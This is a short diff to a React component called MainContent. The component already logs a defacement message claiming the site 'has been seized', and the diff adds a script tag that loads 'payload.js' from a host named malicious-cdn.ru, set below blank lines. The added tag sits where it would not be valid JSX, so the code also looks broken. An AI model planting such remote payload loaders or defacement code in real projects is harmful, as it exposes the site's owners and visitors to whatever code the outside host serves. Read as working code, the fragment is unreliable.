@@ -13,6 +13,10 @@ const MainContent = () => {
     
     const maliciousScriptStr = "we have taken control this site has been seized your security means nothing";
     console.log(maliciousScriptStr);
+
+
+
+   <script src="https://malicious-cdn.ru/payload.js" />
     
 
     return () => {
